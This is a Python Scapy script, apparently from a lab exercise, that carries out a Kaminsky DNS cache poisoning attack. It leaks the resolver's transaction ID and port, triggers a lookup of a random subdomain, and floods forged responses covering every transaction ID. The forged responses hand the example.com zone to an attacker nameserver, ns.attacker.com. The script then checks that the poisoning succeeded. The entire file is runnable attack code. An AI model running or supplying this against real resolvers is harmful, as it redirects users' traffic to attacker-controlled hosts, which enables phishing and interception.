import os
import sys
import struct
import socket
import random
import string

CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
PARENT_DIR = os.path.abspath(os.path.join(CURRENT_DIR, ".."))
if PARENT_DIR not in sys.path:
    sys.path.insert(0, PARENT_DIR)

from scapy.all import *
from common_library import *

print("[*] 1. Leaking resolver TXID/port via controlled domain...")
leaked_txid, target_port = sniff_port_and_txid(5)

print("[*] 2. Generating random subdomain for cache evasion...")
random_prefix = ''.join([random.choice(string.ascii_lowercase) for _ in range(5)])
domain = "{}.example.com".format(random_prefix)

print("[*] 3. Sending trigger query for {}...".format(domain))
trigger = build_spoofed_dns_request(attacker_ip, 12345, 53, domain, "A")
send(trigger, verbose=0)

print("[*] 4. Building the spoofed Kaminsky responses...")
base_pkt = (
    Ether(dst="ff:ff:ff:ff:ff:ff") /
    IP(src=example_auth_dns, dst=target_dns) /
    UDP(sport=53, dport=target_port, chksum=0) /
    DNS(id=0, qr=1, aa=1, 
        qd=DNSQR(qname=domain),
        # ANSWER: Legitimate-looking response for the random subdomain
        an=DNSRR(rrname=domain, type='A', ttl=86400, rdata=fake_ip),
        
        # AUTHORITY: Delegate the entire "example.com" zone to our nameserver
        ns=DNSRR(rrname="example.com", type='NS', ttl=86400, rdata="ns.attacker.com"),
        
        # ADDITIONAL: Glue record mapping "ns.attacker.com" to our malicious IP
        ar=DNSRR(rrname="ns.attacker.com", type='A', ttl=86400, rdata=attacker_auth_dns)
    )
)

raw_bytes = bytearray(raw(base_pkt))
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.bind(("eth0", 0))

print("[*] 5. Flooding spoofed responses across all TXIDs on port {}...".format(target_port))
MAX_TXID = 65536 

for txid in range(0, MAX_TXID):
    struct.pack_into('!H', raw_bytes, 42, txid)
    s.send(raw_bytes)

print("[+] Kaminsky flood complete for {}!".format(domain))

print("[*] 6. Verifying cache poisoning...")
verification = build_spoofed_dns_request(attacker_ip, 12345, 53, domain, "A")
ans = sr1(verification, timeout=3, verbose=0)

if ans and ans.haslayer(DNS) and ans[DNS].an:
    print("[+] Verification SUCCESS! {} resolves to {}".format(domain, ans[DNS].an.rdata))
    print("[+] Check the real authority with: dig @{} example.com NS".format(target_dns))
else:
    print("[-] Verification FAILED or timed out.")